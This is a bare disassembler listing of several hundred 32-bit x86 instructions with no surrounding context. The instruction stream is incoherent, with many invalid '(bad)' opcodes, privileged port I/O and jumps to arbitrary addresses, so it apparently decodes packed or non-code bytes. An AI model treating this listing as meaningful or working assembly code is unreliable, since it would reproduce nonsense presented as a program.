  421b22:	mov    esp,0xa6503f
  421b27:	shl    ebx,cl
  421b29:	sti    
  421b2a:	mov    dh,0x68
  421b2c:	sahf   
  421b2d:	inc    eax
  421b2e:	ins    BYTE PTR es:[edi],dx
  421b2f:	mov    eax,ds:0x6aff84d5
  421b34:	and    eax,0x3f7100fb
  421b39:	xchg   BYTE PTR [ebp+0x4b],dl
  421b3c:	jae    0x421b21
  421b3e:	xor    BYTE PTR [esi],dl
  421b40:	sar    ah,cl
  421b42:	lea    eax,[esi-0x6a00b433]
  421b48:	paddb  mm2,mm7
  421b4b:	xor    bl,BYTE PTR [edx]
  421b4d:	aas    
  421b4e:	test   DWORD PTR [ebx+0x21],edi
  421b51:	jg     0x421ba2
  421b53:	sub    al,0xd1
  421b55:	cld    
  421b56:	push   0x68
  421b58:	mov    al,0x4e
  421b5a:	lock ret 0xac3
  421b5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421b5f:	dec    ebp
  421b60:	rol    DWORD PTR [esi-0x393c4bb],1
  421b66:	jbe    0x421af7
  421b68:	rcl    ah,1
  421b6a:	mov    ebp,eax
  421b6c:	arpl   WORD PTR [esi-0x40],di
  421b6f:	jl     0x421b18
  421b71:	sub    edi,edi
  421b73:	ins    BYTE PTR es:[edi],dx
  421b74:	shr    DWORD PTR [ecx+0x24],1
  421b77:	into   
  421b78:	ja     0x421b5d
  421b7a:	pop    ecx
  421b7b:	jae    0x421b49
  421b7d:	lahf   
  421b7e:	dec    BYTE PTR [ebp+ebp*4+0x3e]
  421b82:	call   0x2cb7ed62
  421b87:	cmp    al,0xf7
  421b89:	jle    0x421b4b
  421b8b:	add    BYTE PTR [edx-0x59f0b899],dh
  421b91:	popf   
  421b92:	pop    esp
  421b93:	pop    esi
  421b94:	ret    0x4e9a
  421b97:	mov    ebp,DWORD PTR [edi]
  421b99:	pop    ebx
  421b9a:	out    0x7c,eax
  421b9c:	fiadd  DWORD PTR ds:0x5bfb4467
  421ba2:	pop    esi
  421ba3:	test   BYTE PTR [ebx],cl
  421ba5:	mov    ds:0xde3a8446,al
  421baa:	outs   dx,BYTE PTR ds:[esi]
  421bab:	or     ah,cl
  421bad:	ins    DWORD PTR es:[edi],dx
  421bae:	inc    edi
  421baf:	pop    ecx
  421bb0:	(bad)  
  421bb1:	jmp    0x3e99db37
  421bb6:	mov    edi,0x90ac1f36
  421bbb:	add    DWORD PTR [ecx+0x5ec13d70],edx
  421bc1:	xor    BYTE PTR [esi+0x561aca55],ch
  421bc7:	std    
  421bc8:	mov    ch,0xbf
  421bca:	nop
  421bcb:	and    ebx,DWORD PTR [esi-0x55]
  421bce:	stc    
  421bcf:	daa    
  421bd0:	ss je  0x421bd2
  421bd3:	mov    DWORD PTR [edx+0x3b2fb597],edi
  421bd9:	stos   DWORD PTR es:[edi],eax
  421bda:	adc    al,0x83
  421bdc:	test   eax,0x2c4ef86c
  421be1:	inc    ecx
  421be2:	pop    ss
  421be3:	push   0x28
  421be5:	xor    bh,bh
  421be7:	out    0x11,eax
  421be9:	mov    eax,DWORD PTR [edx]
  421beb:	cld    
  421bec:	fsin   
  421bee:	mov    ds:0xd8a10058,al
  421bf3:	or     DWORD PTR [ecx-0x407f28a4],ebp
  421bf9:	into   
  421bfa:	push   es
  421bfb:	add    dh,BYTE PTR [ebx-0x7a]
  421bfe:	cmp    al,0x76
  421c00:	or     bh,BYTE PTR [edx+0x5c]
  421c03:	mov    ebx,0x1733cbff
  421c08:	sbb    DWORD PTR [ecx+0x7de7ff30],ebp
  421c0e:	dec    ebx
  421c0f:	add    eax,0x98d803fc
  421c14:	inc    ebx
  421c15:	bound  edx,QWORD PTR [edi]
  421c17:	lahf   
  421c18:	xor    esp,ecx
  421c1a:	or     esp,ebx
  421c1c:	push   eax
  421c1d:	fld    st(3)
  421c1f:	loopne 0x421c54
  421c21:	lods   al,BYTE PTR ds:[esi]
  421c22:	mov    bl,0x86
  421c24:	adc    esp,DWORD PTR [edx-0x45]
  421c27:	mov    esp,DWORD PTR [ebx]
  421c29:	inc    esi
  421c2a:	fnstcw WORD PTR [edx]
  421c2c:	jnp    0x421c56
  421c2e:	icebp  
  421c2f:	or     eax,0xdba3e5c0
  421c34:	or     eax,0x90e5c927
  421c39:	test   DWORD PTR [edx+eax*4+0x12267192],ecx
  421c40:	(bad)  
  421c41:	fidiv  DWORD PTR [eax]
  421c43:	adc    BYTE PTR [ecx-0x66375338],al
  421c49:	adc    BYTE PTR [ebp+edi*4-0x21],0x55
  421c4e:	adc    BYTE PTR [ecx-0x1f],0x1
  421c52:	daa    
  421c53:	push   edx
  421c54:	cdq    
  421c55:	add    BYTE PTR [esi+0x6ddfb553],bl
  421c5b:	push   edx
  421c5c:	xor    al,0x1b
  421c5e:	in     eax,0x98
  421c60:	jmp    0xbc5afd68
  421c65:	jmp    edx
  421c67:	xchg   esi,eax
  421c68:	fcos   
  421c6a:	sbb    BYTE PTR [edx-0x53],dl
  421c6d:	fbstp  TBYTE PTR ds:0x39dfad52
  421c73:	push   eax
  421c74:	lods   eax,DWORD PTR ds:[esi]
  421c75:	fistp  QWORD PTR [ebp+0x56]
  421c78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c79:	fistp  QWORD PTR [ecx-0x77]
  421c7c:	je     0x421c3d
  421c7e:	adc    DWORD PTR [ecx-0x22ef967],0xfda13ea1
  421c88:	sar    edi,0xd6
  421c8b:	cdq    
  421c8c:	jmp    0x1a3fa60b
  421c91:	sbb    al,0xa6
  421c93:	mov    eax,0x31e303e9
  421c98:	jmp    0x3dd3642c
  421c9d:	loopne 0x421c44
  421c9f:	xchg   ecx,eax
  421ca0:	xor    eax,0xae9df8
  421ca5:	rcr    ebx,1
  421ca7:	fsubr  QWORD PTR [eax+0x59]
  421caa:	push   esi
  421cab:	and    eax,0xbce892fb
  421cb0:	inc    edx
  421cb1:	(bad)  
  421cb2:	popa   
  421cb3:	fldcw  WORD PTR [eax+0x5e]
  421cb6:	jle    0x421cdd
  421cb8:	sti    
  421cb9:	mov    es,WORD PTR [eax]
  421cbb:	pop    es
  421cbc:	cdq    
  421cbd:	pop    ecx
  421cbe:	and    bl,ah
  421cc0:	sbb    al,0xfb
  421cc2:	xchg   edx,eax
  421cc3:	retf   
  421cc4:	push   ecx
  421cc5:	inc    esp
  421cc6:	int    0xad
  421cc8:	fild   DWORD PTR [edx-0x27]
  421ccb:	cmp    bl,BYTE PTR [eax-0x78f952dc]
  421cd1:	push   edi
  421cd2:	push   0x22
  421cd4:	sar    BYTE PTR [esi-0x78779e0b],0x3d
  421cdb:	les    edx,FWORD PTR [ecx+0x75]
  421cde:	icebp  
  421cdf:	or     al,0x2e
  421ce1:	je     0x421c98
  421ce3:	imul   edx,esp,0x586737a6
  421ce9:	shl    BYTE PTR [ebp+0x11528dda],0x9
  421cf0:	es sti 
  421cf2:	push   ds
  421cf3:	loop   0x421d59
  421cf5:	je     0x421ca2
  421cf7:	fcmove st,st(7)
  421cf9:	sub    BYTE PTR [ebp+0x15],bh
  421cfc:	and    al,0x69
  421cfe:	jmp    0x939740ee
  421d03:	bound  esi,QWORD PTR [ecx]
  421d05:	pushf  
  421d06:	mov    al,ds:0xf187d961
  421d0b:	mov    ah,0x25
  421d0d:	je     0x421d22
  421d0f:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  421d11:	adc    BYTE PTR [edx+0x2c],dh
  421d14:	cld    
  421d15:	ins    BYTE PTR es:[edi],dx
  421d16:	sub    eax,0xdd752666
  421d1b:	mov    WORD PTR [ebp-0x80],ds
  421d1e:	add    BYTE PTR [eax],al
  421d20:	cli    
  421d21:	xlat   BYTE PTR ds:[ebx]
  421d22:	add    BYTE PTR [esi-0x3c],dl
  421d25:	inc    esi
  421d26:	xor    ebp,DWORD PTR [edx+0x9]
  421d29:	jne    0x421d76
  421d2b:	call   0x3efae4
  421d30:	jo     0x421d1f
  421d32:	mov    al,dh
  421d34:	sar    DWORD PTR [edx],cl
  421d36:	mov    al,ds:0xfc0f4fe
  421d3b:	jmp    FWORD PTR [esi+0x2d]
  421d3e:	call   0xcefe:0xfb197728
  421d45:	sub    edx,DWORD PTR [ebp-0x1]
  421d48:	pop    ebx
  421d49:	adc    eax,0xa097c480
  421d4e:	jmp    0x421d38
  421d50:	or     DWORD PTR [edi-0x3],edi
  421d53:	push   DWORD PTR [eax]
  421d55:	out    0x5c,al
  421d57:	jmp    0x421cf2
  421d59:	fsubr  QWORD PTR [esi+0x10]
  421d5c:	jmp    0x6edc:0x7b4466ff
  421d63:	or     al,0xed
  421d65:	fmul   QWORD PTR [ebx+0x38]
  421d68:	or     ah,ah
  421d6a:	pop    es
  421d6b:	pop    esi
  421d6c:	out    0x98,al
  421d6e:	dec    esi
  421d6f:	mov    edx,DWORD PTR [edi+0x76]
  421d72:	mov    BYTE PTR [ebp+0x73],dh
  421d75:	mov    ds:0xbeff74f5,al
  421d7a:	ja     0x421d25
  421d7c:	fnstsw WORD PTR gs:[edi-0x40]
  421d80:	iret   
  421d81:	inc    ecx
  421d82:	push   esp
  421d83:	push   esi
  421d84:	add    BYTE PTR [ebx+0x33],dh
  421d87:	std    
  421d88:	push   DWORD PTR [esp+eiz*4]
  421d8b:	mov    ebx,0x6a20974
  421d90:	sub    BYTE PTR [edi+0x3b6a0091],dl
  421d96:	mov    ch,0x0
  421d98:	push   esi
  421d99:	bound  edx,QWORD PTR [esi-0x69517fd]
  421d9f:	add    al,0x0
  421da1:	fstp   DWORD PTR [eax]
  421da3:	mov    ebx,edi
  421da5:	mov    es,esi
  421da7:	push   DWORD PTR [ebp+0x52]
  421daa:	mov    bh,0x11
  421dac:	sub    BYTE PTR [esi+0x77fb04fc],al
  421db2:	sub    al,0x90
  421db4:	adc    DWORD PTR [edx],0x31
  421db7:	(bad)  
  421db8:	push   DWORD PTR [ebx+ecx*2]
  421dbb:	jne    0x421df9
  421dbd:	dec    eax
  421dbe:	xor    DWORD PTR [esi+0x50],edx
  421dc1:	mov    edx,0xc5fbfef7
  421dc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421dc7:	iret   
  421dc8:	xchg   DWORD PTR [edx-0x4b6172a8],esi
  421dce:	mov    bl,0xeb
  421dd0:	adc    al,0xad
  421dd2:	add    eax,0x147aa10f
  421dd7:	inc    ebx
  421dd8:	add    BYTE PTR [ebp-0x6aadf4fb],bl
  421dde:	pusha  
  421ddf:	cmp    edi,DWORD PTR [edi-0x5a]
  421de2:	sub    al,0x8a
  421de4:	lock jp 0x421e29
  421de7:	lods   al,BYTE PTR ds:[esi]
  421de8:	cli    
  421de9:	add    BYTE PTR [ebp-0x49],bh
  421dec:	(bad)  
  421ded:	pop    ebx
  421dee:	mov    esi,edi
  421df0:	std    
  421df1:	jne    0x421e45
  421df3:	xchg   ecx,eax
  421df4:	sub    al,0x6c
  421df6:	push   ds
  421df7:	xor    dh,bh
  421df9:	jne    0x421e69
  421dfb:	(bad)  
  421dfc:	(bad)  
  421dfd:	push   eax
  421dfe:	xchg   esi,eax
  421dff:	scas   eax,DWORD PTR es:[edi]
  421e00:	enter  0xac0c,0x7d
  421e04:	ret    0xb151
  421e07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421e08:	pusha  
  421e09:	and    al,0x52
  421e0b:	inc    edx
  421e0c:	mov    dh,BYTE PTR ds:0x43a48a
  421e12:	xchg   ebp,eax
  421e13:	fldcw  WORD PTR [esi+0x7f]
  421e16:	jle    0x421de5
  421e18:	jo     0x421e91
  421e1a:	inc    esi
  421e1b:	aad    0x6c
  421e1d:	add    ah,BYTE PTR [esi+0x5d]
  421e20:	imul   eax,DWORD PTR [ebx],0x62
  421e23:	fldcw  WORD PTR [esi+ebx*8+0x59]
  421e27:	push   ebx
  421e28:	push   ebx
  421e29:	add    esp,DWORD PTR [edx-0x27]
  421e2c:	rcl    eax,0xca
  421e2f:	and    ch,BYTE PTR [edx+0x6dd22287]
  421e35:	xchg   BYTE PTR [edx-0x27],ah
  421e38:	jmp    0xfddd0d95
  421e3d:	push   ebx
  421e3e:	push   ebp
  421e3f:	adc    al,0x8a
  421e41:	mov    WORD PTR [esi],fs
  421e43:	std    
  421e44:	in     eax,0x2
  421e46:	ins    BYTE PTR es:[edi],dx
  421e47:	xchg   ebp,eax
  421e48:	xlat   BYTE PTR ds:[ebx]
  421e49:	inc    ebx
  421e4a:	(bad)  
  421e4b:	out    0x7b,al
  421e4d:	mov    BYTE PTR [eax],al
  421e4f:	lea    esp,[edx+0x2a26fa29]
  421e55:	in     eax,dx
  421e56:	add    al,0x2e
  421e58:	icebp  
  421e59:	outs   dx,BYTE PTR ds:[esi]
  421e5a:	dec    edi
  421e5b:	inc    esi
  421e5c:	leave  
  421e5d:	mov    edi,0x52ec9903
  421e62:	nop
  421e63:	sbb    ebx,ebp
  421e65:	iret   
  421e66:	push   es
  421e67:	jp     0x421eae
  421e69:	mov    eax,0x295c6204
  421e6e:	ja     0x421ec3
  421e70:	scas   eax,DWORD PTR es:[edi]
  421e71:	jmp    0xe89af906
  421e76:	add    esp,DWORD PTR [edx+0x31]
  421e79:	mov    esi,0x6cd96264
  421e7e:	ret    
  421e7f:	(bad)  
  421e81:	mov    ds:0x359e3d3e,eax
  421e86:	out    dx,al
  421e87:	pop    esp
  421e88:	in     al,dx
  421e89:	sub    DWORD PTR [ebx-0x40],eax
  421e8c:	push   edx
  421e8d:	add    BYTE PTR [ebp-0x7823c8],ch
  421e93:	arpl   WORD PTR [esi-0x389cfedc],sp
  421e99:	inc    eax
  421e9a:	sti    
  421e9b:	mov    eax,ds:0x99c485d9
  421ea0:	sar    bl,1
  421ea2:	push   ebp
  421ea3:	cmp    bh,cl
  421ea5:	mov    eax,ds:0x959211
  421eaa:	sbb    bl,BYTE PTR [ebx-0x20e6afdc]
  421eb0:	adc    eax,0xfe00620c
  421eb5:	xor    DWORD PTR [edi-0x78e29faf],ecx
  421ebb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ebc:	cmp    eax,0x8d620e38
  421ec1:	icebp  
  421ec2:	ins    BYTE PTR es:[edi],dx
  421ec3:	and    eax,0xcd742466
  421ec8:	gs nop
  421eca:	push   ebx
  421ecb:	jle    0x421ee5
  421ecd:	mov    DWORD PTR [edi-0x53],edi
  421ed0:	push   edx
  421ed1:	test   BYTE PTR [edx+0x12],bl
  421ed4:	or     DWORD PTR [edi+0xc],ebx
  421ed7:	jmp    0xed66c53e
  421edc:	bound  esp,QWORD PTR [esi-0x599d1adc]
  421ee2:	and    al,0xdd
  421ee4:	jns    0x421edf
  421ee6:	sti    
  421ee7:	inc    esi
  421ee8:	arpl   WORD PTR [ecx],bx
  421eea:	push   ebp
  421eeb:	jb     0x421f5f
  421eed:	mov    al,ds:0x8c1bddec
  421ef2:	xchg   DWORD PTR [ebx],esi
  421ef4:	fild   QWORD PTR [edx]
  421ef6:	call   0xfb6685ac
  421efb:	imul   ebx,DWORD PTR [ebp+0x61ad674b],0x5c640bd9
  421f05:	fiadd  DWORD PTR [eax]
  421f07:	add    BYTE PTR [ebx],bh
  421f09:	push   edi
  421f0a:	out    dx,al
  421f0b:	je     0x421f32
  421f0d:	scas   al,BYTE PTR es:[edi]
  421f0e:	adc    ecx,DWORD PTR [ebp-0x17a6d02a]
  421f14:	push   0xfff67c
  421f19:	xchg   ecx,eax
  421f1a:	fimul  DWORD PTR [edi-0x1]
  421f1d:	push   ss
  421f1e:	or     al,0xb
  421f20:	inc    eax
  421f21:	or     ecx,DWORD PTR [edi+0x55]
  421f24:	in     al,dx
  421f25:	adc    BYTE PTR [eax+ebp*8],0x4f
  421f29:	pop    esi
  421f2a:	aad    0x0
  421f2c:	test   ebx,ecx
  421f2e:	enter  0xe085,0xb
  421f32:	fadd   QWORD PTR [eax]
  421f34:	push   0x57
  421f36:	scas   eax,DWORD PTR es:[edi]
  421f37:	add    bh,bh
  421f39:	push   es
  421f3a:	xchg   esp,eax
  421f3b:	ja     0x421f81
  421f3d:	retf   
  421f3e:	fcom   DWORD PTR [edx]
  421f40:	cld    
  421f41:	fistp  DWORD PTR [ebx+0x56eb8b00]
  421f47:	out    dx,al
  421f48:	je     0x421ef3
  421f4a:	dec    esp
  421f4b:	(bad)  
  421f4c:	call   0x42b125
  421f51:	add    al,0xd2
  421f53:	and    BYTE PTR [edx+0x7e89d57b],ah
  421f59:	dec    edi
  421f5a:	cs cli 
  421f5c:	xor    dh,BYTE PTR ds:0x70fee57
  421f62:	push   0x0
  421f64:	add    BYTE PTR [ebx+0x4c],bh
  421f67:	(bad)  
  421f68:	call   0x393be9
  421f6d:	pop    es
  421f6e:	sbb    al,0x7
  421f70:	test   BYTE PTR [esp+ebx*8],dl
  421f73:	add    BYTE PTR [eax],al
  421f75:	and    eax,DWORD PTR [edi]
  421f77:	sahf   
  421f78:	(bad)  
  421f79:	cmp    al,0x58
  421f7b:	ror    BYTE PTR [edi],0x0
  421f7e:	(bad)  
  421f7f:	dec    esp
  421f80:	add    BYTE PTR [eax],al
  421f82:	bound  esi,QWORD PTR [eax]
  421f84:	test   ah,ch
  421f86:	pop    esi
  421f87:	jge    0x421fda
  421f89:	xor    BYTE PTR [eax],cl
  421f8b:	inc    edx
  421f8c:	or     DWORD PTR [esi],edi
  421f8e:	bound  ebp,QWORD PTR [ecx+0x6cc62832]
  421f94:	jmp    edi
  421f96:	push   ds
  421f97:	sub    edi,esi
  421f99:	(bad)  
  421f9a:	fbstp  TBYTE PTR [eax+0x79]
  421f9d:	fs loope 0x421fac
  421fa0:	adc    BYTE PTR [ebp-0x7f49435c],cl
  421fa6:	fs repnz add al,0xe8
  421faa:	retf   0x41a
  421fad:	add    bh,ah
  421faf:	jo     0x42202a
  421fb1:	push   eax
  421fb2:	loope  0x421fc8
  421fb4:	adc    BYTE PTR [ebp+0x5eb9289c],cl
  421fba:	pop    ebp
  421fbb:	repnz add al,0xe8
  421fbe:	push   es
  421fbf:	jnp    0x421fc5
  421fc1:	add    bh,bl
  421fc3:	jo     0x42203e
  421fc5:	cmp    al,0xe1
  421fc7:	pushf  
  421fc8:	adc    BYTE PTR [ebp-0xd46ebec],cl
  421fce:	gs repnz add al,0xe8
  421fd2:	shr    BYTE PTR [edx+0x70e70004],cl
  421fd8:	jns    0x422002
  421fda:	loope  0x421f60
  421fdc:	adc    BYTE PTR [ebp+0x59b9602c],cl
  421fe2:	add    BYTE PTR [ebx+0x72],ch
  421fe5:	jmp    edi
  421fe7:	push   cs
  421fe8:	mov    al,BYTE PTR [eax+eax*1]
  421feb:	fcomip st,st(0)
  421fed:	jns    0x422003
  421fef:	mov    bh,BYTE PTR [ecx-0x538a055e]
  421ff5:	les    esi,FWORD PTR [ecx+ebx*2-0xa]
  421ff9:	or     DWORD PTR [edx+0x3add8f9],edx
  421fff:	arpl   WORD PTR [ecx-0x18],bp
  422002:	jmp    0x95be:0x2bcc5a70
  422009:	jmp    0x4bee5a11
  42200e:	(bad)  
  42200f:	cmp    DWORD PTR [edx-0x1d],edx
  422012:	imul   esp,DWORD PTR [ebx+0x52],0xeb52ff23
  422019:	sub    DWORD PTR [edi-0x78],ebx
  42201c:	adc    BYTE PTR [esi+0x662ce558],ah
  422022:	out    dx,eax
  422023:	scas   al,BYTE PTR es:[edi]
  422024:	xchg   DWORD PTR [esp+ecx*8+0x59],ebp
  422028:	push   ebp
  422029:	fwait
  42202a:	add    esp,DWORD PTR [edx-0x27]
  42202d:	outs   dx,BYTE PTR ds:[esi]
  42202e:	js     0x42209e
  422030:	push   esp
  422031:	mov    bl,0xe
  422033:	ficomp WORD PTR [ecx]
  422035:	jmp    0xf09a823d
  42203a:	dec    eax
  42203b:	xchg   esp,eax
  42203c:	call   0xb024:0x4c757839
  422043:	xor    dh,BYTE PTR [ebx+0x370090e9]
  422049:	add    DWORD PTR [ecx-0x16269c9a],eax
  42204f:	mov    ch,BYTE PTR [edx+0x6178b053]
  422055:	mov    bl,0x75
  422057:	in     al,dx
  422058:	int3   
  422059:	fsubr  st,st(1)
  42205b:	add    ebx,ebp
  42205d:	xchg   ebx,eax
  42205e:	icebp  
  42205f:	sbb    BYTE PTR [edx-0xd791533],0xd8
  422066:	jmp    0x6536a96e
  42206b:	test   BYTE PTR [ebp-0x65],bl
  42206e:	jmp    0x51343fd
  422073:	jg     0x422061
  422075:	sbb    al,0x0
  422077:	or     bh,BYTE PTR [ecx-0x61]
  42207a:	xchg   DWORD PTR [eax+0x6a74365d],ebp
  422080:	xchg   ecx,ebx
  422082:	out    0x98,eax
  422084:	fs push 0xb338f941
  42208a:	or     edx,DWORD PTR [esi-0x62]
  42208d:	retf   
  42208e:	out    0x8a,eax
  422090:	ins    BYTE PTR es:[edi],dx
  422091:	push   0x1c09ed41
  422096:	outs   dx,DWORD PTR ds:[esi]
  422097:	out    dx,eax
  422098:	pop    esp
  422099:	push   0x8738d541
  42209e:	rcl    ecx,0x63
  4220a1:	pushf  
  4220a2:	enter  0xbdf,0x8f
  4220a6:	jg     0x42208f
  4220a8:	push   cs
  4220a9:	xor    eax,0xa100d746
  4220ae:	int    0x4
  4220b0:	cmp    eax,0x28b3d064
  4220b5:	dec    esp
  4220b6:	xor    al,0x3c
  4220b8:	push   0x1e
  4220ba:	and    edi,esp
  4220bc:	not    BYTE PTR [esi+0x68]
  4220bf:	inc    ecx
  4220c0:	add    ecx,ebx
  4220c2:	jmp    0xc2e7:0xbd21560b
  4220c9:	pop    esi
  4220ca:	push   0x1a62f141
  4220cf:	out    0xca,eax
  4220d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4220d2:	xlat   BYTE PTR ds:[ebx]
  4220d3:	or     BYTE PTR [ecx],al
  4220d5:	push   ds
  4220d6:	(bad)  
  4220d8:	aam    0x5e
  4220da:	push   0x9aedd41
  4220df:	out    0xf9,eax
  4220e1:	outs   dx,BYTE PTR ds:[esi]
  4220e2:	push   0x31a0ed41
  4220e7:	add    al,0x42
  4220e9:	shl    BYTE PTR [bp+di+0x55a8],1
  4220ee:	sbb    ch,al
  4220f0:	add    BYTE PTR [esi-0xdfe1fa7],cl
  4220f6:	shr    BYTE PTR [ebx],cl
  4220f8:	shl    BYTE PTR [eax],0xd6
  4220fb:	(bad)  
  4220fc:	std    
  4220fd:	and    bh,dl
  4220ff:	(bad)  
  422100:	(bad)  
  422101:	and    edi,DWORD PTR [esi-0x37]
  422104:	ret    0xd853
  422107:	lea    ecx,[ecx+0x3b]
  42210a:	das    
  42210b:	add    al,BYTE PTR [edx+0x3b]
  42210e:	sub    DWORD PTR [edx],eax
  422110:	inc    edx
  422111:	add    BYTE PTR [ebx+0x1b],cl
  422114:	add    al,BYTE PTR [edx+0x4b]
  422117:	fld    DWORD PTR [ebx]
  422119:	inc    edx
  42211a:	cmp    ecx,edi
  42211c:	add    eax,DWORD PTR [edx+0x3b]
  42211f:	and    BYTE PTR [edx],al
  422121:	inc    edx
  422122:	or     esi,esp
  422124:	add    eax,DWORD PTR [edx+0xb]
  422127:	jecxz  0x42212c
  422129:	inc    edx
  42212a:	sti    
  42212b:	loopne 0x422130
  42212d:	inc    edx
  42212e:	sti    
  42212f:	xchg   esi,eax
  422130:	add    eax,DWORD PTR [edx+0xb]
  422133:	and    BYTE PTR [edx],al
  422135:	inc    edx
  422136:	or     ecx,DWORD PTR [edi-0x7904bdfd]
  42213c:	add    eax,DWORD PTR [edx-0x5]
  42213f:	jle    0x422144
  422141:	inc    edx
  422142:	retf   
  422143:	mov    ecx,0xbccb4203
  422148:	add    eax,DWORD PTR [edx-0x45]
  42214b:	add    BYTE PTR [ebx+0x102c38ec],0x8d
  422152:	mov    fs,WORD PTR ds:0xc38eff50
  422158:	adc    DWORD PTR [eax-0x45],eax
  42215b:	dec    edx
  42215c:	dec    ebp
  42215d:	lock jecxz 0x422139
  422160:	add    BYTE PTR [eax],al
  422162:	mov    ecx,DWORD PTR [esi]
  422164:	mov    ebx,0x512c1055
  422169:	push   ecx
  42216a:	bound  esi,QWORD PTR [ebp+0x6132f842]
  422170:	cld    
  422171:	adc    eax,0x3f00fe
  422176:	add    cl,ch
  422178:	ins    BYTE PTR es:[edi],dx
  422179:	test   DWORD PTR [edi+0x69e627],0x7ffff0e3
  422183:	and    eax,DWORD PTR [edi]
  422185:	addr16 sub ah,0x58
  422189:	call   DWORD PTR [ebx+eax*4]
  42218c:	jb     0x4221ef
  42218e:	cli    
  42218f:	mov    dl,0x61
  422191:	out    0x2,eax
  422193:	outs   dx,BYTE PTR ds:[esi]
  422194:	cs dec eax
  422197:	and    DWORD PTR [eax-0xdec7842],ebp
  42219d:	jmp    0xff72a0b2
  4221a2:	cli    
  4221a3:	bound  esp,QWORD PTR [edi]
  4221a5:	lds    eax,FWORD PTR [edi+0xe2b233]
  4221ab:	or     eax,0x3c0ff31
  4221b0:	and    DWORD PTR [edx],ecx
  4221b2:	shl    DWORD PTR [ebx],1
  4221b4:	or     DWORD PTR [ecx+eax*8],ecx
  4221b7:	add    BYTE PTR [ecx],ch
  4221b9:	or     bh,BYTE PTR [esi+0x5553c221]
  4221bf:	fstp   DWORD PTR [ecx]
  4221c1:	mov    edx,esi
  4221c3:	jmp    0x36cb26ad
  4221c8:	adc    al,0x7
  4221ca:	call   0xfc39656a
  4221cf:	xchg   ebp,esi
  4221d1:	push   edx
  4221d2:	aas    
  4221d3:	adc    bl,BYTE PTR [esi+edi*8]
  4221d6:	mov    cs:0x10349,al
  4221dc:	bound  esi,QWORD PTR [eax]
  4221de:	push   ecx
  4221df:	push   ebx
  4221e0:	cmp    BYTE PTR [esi],dh
  4221e2:	pop    esp
  4221e3:	xchg   DWORD PTR [edi-0x7a009127],edx
  4221e9:	je     0x422259
  4221eb:	dec    ecx
  4221ec:	xor    WORD PTR [ecx+0x601a89fb],ax
  4221f3:	inc    edi
  4221f4:	dec    si
  4221f6:	mov    ah,0xb
  4221f8:	mov    bh,BYTE PTR [edx+edi*1]
  4221fb:	sti    
  4221fc:	imul   edx,DWORD PTR [eax-0x5a],0x9c62590b
  422203:	pop    es
  422204:	in     eax,0x17
  422206:	sub    ah,ch
  422208:	push   0x18
  42220a:	or     BYTE PTR [esp+edx*1],cl
  42220d:	sbb    ch,cl
  42220f:	add    esp,DWORD PTR [edx-0xa]
  422212:	daa    
  422213:	mov    db6,ebx
  422216:	jo     0x42225f
  422218:	retfw  0x4932
  42221c:	push   edx
  42221d:	dec    esi
  42221e:	sub    ch,al
  422220:	cmp    dl,cl
  422222:	mov    ch,0x23
  422225:	cmp    cl,dh
  422227:	push   cs
  422228:	and    esi,DWORD PTR [ebx-0x358db990]
  42222e:	call   0xac4:0xa84e5448
  422235:	rol    DWORD PTR [esi],1
  422237:	(bad)  
  422238:	and    edi,DWORD PTR [eax]
  42223a:	icebp  
  42223b:	push   cs
  42223c:	and    esi,DWORD PTR [ebx+0x54004660]
  422242:	retf   0x4872
  422245:	jbe    0x422295
  422247:	test   al,0xc4
  422249:	retf   0xc6d0
  42224c:	lds    esp,FWORD PTR [ebx-0x5cf11ec9]
  422252:	mov    dl,0x60
  422254:	inc    esi
  422255:	push   esi
  422256:	retf   0x483a
  422259:	push   eax
  42225a:	dec    esi
  42225b:	test   al,0xc4
  42225d:	mov    edx,0x9fca00d0
  422262:	pop    ss
  422263:	loope  0x422246
  422265:	ins    BYTE PTR es:[edi],dx
  422266:	sbb    BYTE PTR [edx+0x70],ah
  422269:	sbb    al,0xc7
  42226b:	or     edx,DWORD PTR [esi+0x2887c11a]
  422271:	sahf   
  422272:	xor    BYTE PTR [eax],cl
  422274:	or     ah,BYTE PTR [edi+edx*1+0x1864f1e1]
  42227b:	bound  esi,QWORD PTR [eax+0x24]
  42227e:	ror    DWORD PTR [ebx],0x7e
  422281:	sbb    al,bl
  422283:	xchg   DWORD PTR [eax],ebp
  422285:	add    cl,BYTE PTR es:[eax]
  422288:	retf   0x1b1f
  42228b:	loope  0x42227e
  42228d:	pop    esp
  42228e:	sbb    ah,BYTE PTR [edx+0x60]
  422291:	pushf  
  422292:	out    dx,eax
  422293:	or     edx,DWORD PTR [esi-0x56]
  422296:	cmc    
  422297:	xchg   DWORD PTR [ebp+0x2887f155],edx
  42229d:	add    cl,BYTE PTR es:[eax]
  4222a0:	retf   0x1b1f
  4222a3:	loope  0x422286
  4222a5:	add    BYTE PTR [edx+ebx*1+0x62],ch
  4222a9:	jo     0x42224a
  4222ab:	cmc    
  4222ac:	test   esp,ecx
  4222ae:	xchg   edx,eax
  4222af:	retf   0x3587
  4222b2:	inc    edx
  4222b3:	cmc    
  4222b4:	data16 loop 0x42224f
  4222b7:	pusha  
  4222b8:	cmc    
  4222b9:	jb     0x4222b2
  4222bb:	or     BYTE PTR [ebp-0x17265a8e],ah
  4222c1:	xchg   ecx,eax
  4222c2:	call   0x67a31ddb
  4222c7:	pusha  
  4222c8:	dec    ebp
  4222c9:	in     eax,dx
  4222ca:	leave  
  4222cb:	and    edi,edx
  4222cd:	sahf   
  4222ce:	retf   
  4222cf:	bound  edi,QWORD PTR [edi]
  4222d1:	in     eax,dx
  4222d2:	(bad)  
  4222d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4222d4:	sub    BYTE PTR [ecx+0xfb13a7],al
  4222da:	fsub   QWORD PTR [ebx+edi*1+0x28]
  4222de:	xor    BYTE PTR [ecx+0x664c1024],dh
  4222e4:	mov    ebx,0x59b66e5e
  4222e9:	ret    0xdc93
  4222ec:	dec    ebx
  4222ed:	mov    ecx,edi
  4222ef:	clc    
  4222f0:	or     BYTE PTR [ebp-0x3b],dl
  4222f3:	test   eax,0x400f283
  4222f8:	test   ebx,ebx
  4222fa:	mov    dh,0xe4
